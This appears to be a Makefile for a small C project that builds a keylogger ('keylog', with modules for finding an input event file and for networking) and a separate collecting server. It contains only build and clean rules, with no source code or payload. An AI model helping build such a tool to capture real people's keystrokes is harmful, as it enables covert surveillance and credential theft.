CC=gcc
CFLAGS=-c -Wall
KEYLOG_TARGETS=main.o keylogger.o networking.o find_event_file.o
SERVER_TARGETS=server.o networking.o

all: keylog server

keylog: $(KEYLOG_TARGETS)
	$(CC) $^ -o $@

server: $(SERVER_TARGETS)
	$(CC) $^ -o $@


.PHONY: clean
clean:
	@echo "Cleaning..."
	-rm -f keylog server *.o
	@echo "Finished cleaning."
